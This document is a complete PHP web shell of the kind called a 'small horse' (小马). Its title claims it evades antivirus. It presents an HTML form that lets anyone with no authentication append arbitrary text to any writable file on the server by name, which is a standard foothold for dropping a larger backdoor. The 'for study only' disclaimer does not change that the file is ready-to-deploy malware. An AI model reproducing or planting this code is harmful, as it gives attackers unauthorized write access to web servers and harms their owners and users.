 <TITLE>系统专用全免PHP小马</TITLE>
<form id="form1" name="form1" method="post" action="?action=set">
  <label>
  内容：<br />
  <br />
  <textarea name="text" cols="55" rows="10"></textarea>
  </label>
  <label> <br /><font color=red>问文件仅供学习使用，如果发现威胁文件，请到<a href="http://www.tosec.cn" title="网站安全">Tosec.cn</a>解除你的危险状况</font><br />
  <br />
  文件名:<br />
  <input name="filename" type="text" size="57" maxlength="55" />
  </label>

  <br />

  <label>
  <input type="submit" name="Submit" value="保存" />
  </label>
</form>
<?
if($_GET["action"] == 'set') 
{ 
$filename = $_POST["filename"];
$love = $_POST["text"];
$fp = fopen($filename,"r");
$recontent  = fread($fp,filesize($filename));	
$handle = fopen($filename,"w");
if (is_writable($filename)) 
{ 
	if (!$handle = fopen($filename, 'a')) 
	{ 
		print "不能打开文件"; 
		exit; 
	} 
	$content = $recontent.$love;
	if (!fwrite($handle, $content)) { 
		print "不能写入到文件"; 
		exit; 
	} 
	print "保存成功"; 
	fclose($handle); 
} 
else 
{ 
	print "不可写"; 
} 
} 
?> 